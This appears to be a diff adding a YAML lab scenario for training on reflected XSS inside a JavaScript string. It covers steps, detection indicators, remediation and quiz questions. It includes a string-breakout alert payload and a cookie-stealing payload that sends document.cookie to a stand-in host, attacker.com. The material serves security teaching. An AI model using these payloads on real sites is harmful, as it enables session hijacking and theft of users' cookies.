@@ -1,0 +1,92 @@
+# Category: Cross-Site Scripting (XSS)
+name: "Reflected XSS into a JavaScript string with angle brackets HTML encoded"
+id: "xss-reflected-javascript-string-001"
+category: "xss"
+subcategory: "reflected"
+difficulty: "apprentice"
+estimated_time: "30 minutes"
+
+description: |
+  This scenario covers reflected XSS where the input is reflected inside
+  a JavaScript string literal (e.g., `var name = "USER_INPUT";`) and angle
+  brackets are HTML-encoded, but backslashes and quotes are not properly
+  escaped. The attacker can break out of the string by injecting a quote
+  and backslash.
+
+learning_objectives:
+  - Understand XSS in JavaScript string context
+  - Escape from a JavaScript string using backslashes and quotes
+  - Exploit when angle brackets are encoded but string delimiters are not
+
+tools:
+  - Burp Suite
+  - curl
+
+prerequisites:
+  - Basic understanding of JavaScript strings
+  - Access to a vulnerable web application or lab
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "Identify input that appears in a JavaScript string"
+    commands:
+      - "# Look for scripts that include user input"
+      - "# Example: <script>var name = 'PARAM';</script>"
+    expected_output: "Input is reflected inside a JavaScript string"
+    detection: "None"
+
+  - id: "step2"
+    phase: "exploitation"
+    action: "Break out of the string and inject code"
+    commands:
+      - "# Payload: '; alert('XSS'); //"
+      - "# This closes the string, adds an alert, and comments out the rest"
+    expected_output: "JavaScript alert executes"
+    detection: "Web server logs may show unusual parameters"
+
+  - id: "step3"
+    phase: "post_exploitation"
+    action: "Steal data via injected script"
+    commands:
+      - "# Payload: '; document.location='http://attacker.com/steal?cookie='+document.cookie; //"
+    expected_output: "Cookie exfiltrated"
+    detection: "Attacker server logs"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1189"
+    description: "Drive-by Compromise"
+  - standard: "OWASP"
+    control: "A03:2021"
+    description: "Injection"
+
+detection:
+  network_indicators:
+    - "Requests with payloads containing semicolons and quotes"
+  log_indicators:
+    - "Web server logs with unusual parameters"
+  endpoint_indicators:
+    - "None"
+
+remediation:
+  immediate:
+    - "Escape backslashes and quotes in JavaScript strings"
+    - "Use JSON encoding for JavaScript contexts"
+  long_term:
+    - "Avoid injecting user input into JavaScript"
+    - "Use data attributes instead of inline scripts"
+
+variables:
+  target_url: "http://example.com/page?param=PAYLOAD"
+
+assessment_questions:
+  - "How can you break out of a JavaScript string?"
+  - "What characters need to be escaped in a JavaScript string?"
+  - "What is the difference between HTML encoding and JavaScript string escaping?"
+
+references:
+  - url: "https://owasp.org/www-community/attacks/xss/"
+    title: "OWASP XSS"
+  - url: "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
+    title: "OWASP XSS Prevention"
